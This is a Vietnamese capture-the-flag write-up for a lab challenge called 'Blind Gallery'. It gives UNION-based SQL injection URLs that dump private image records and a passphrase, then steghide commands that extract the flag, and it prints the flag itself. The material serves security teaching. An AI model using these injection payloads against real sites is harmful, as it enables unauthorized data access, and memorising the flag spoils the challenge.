# Blind Gallery - Writeup

## 1. Khảo sát gallery

Trang chính hiển thị một số ảnh public. Mỗi ảnh dẫn tới endpoint:

```text
/image?id=1
```

## 2. Kiểm tra tham số id

Thử một id không tồn tại:

```bash
http://127.0.0.1:8084/image?id=999
```

Trang trả về `No image`.

## 3. Thử lỗi quote SQL

```bash
http://127.0.0.1:8084/image?id=1'
```

Nếu response có SQL error, có thể nghi ngờ tham số `id` được nối trực tiếp vào query.

## 4. Xác định số cột

Endpoint render ba trường: title, filename, description. Có thể thử `UNION SELECT` với 3 cột:

```bash
http://127.0.0.1:8084/image?id=-1' UNION SELECT 'a','b','c'--
```

Nếu trang hiển thị `a`, `b`, `c`, số cột là đúng.

## 5. Đọc bảng images

Tên bảng là `images` theo ngữ cảnh gallery. Query:

```bash
http://127.0.0.1:8084/image?id=-1' UNION SELECT title,filename,description FROM images--
```

Kết quả sẽ thấy nhiều ảnh, cả public và non-public.

## 6. Lọc ảnh private

```bash
http://127.0.0.1:8084/image?id=-1' UNION SELECT title,filename,description FROM images WHERE is_public=0--
```

Trong response có record quan trọng:

```text
Archive 713
archive_713.jpg
passphrase: night-shift-713
```

## 7. Tải ảnh archive

```bash
http://127.0.0.1:8084/download?file=archive_713.jpg
```

Ảnh xem bình thường, không có flag bằng `strings`.

## 8. Kiểm tra steghide

Cài tool trên Ubuntu:

```bash
sudo apt install steghide
```

Kiểm tra file:

```bash
steghide info archive_713.jpg
```

Khi hỏi passphrase, nhập:

```text
night-shift-713
```

## 9. Extract flag

```bash
steghide extract -sf archive_713.jpg -p night-shift-713
```

Tool sẽ extract file:

```text
flag.txt
```

## 10. Đọc flag

```bash
cat flag.txt
```

Kết quả:

```text
blockChainPTIT{sqli_steghide_gallery}
```
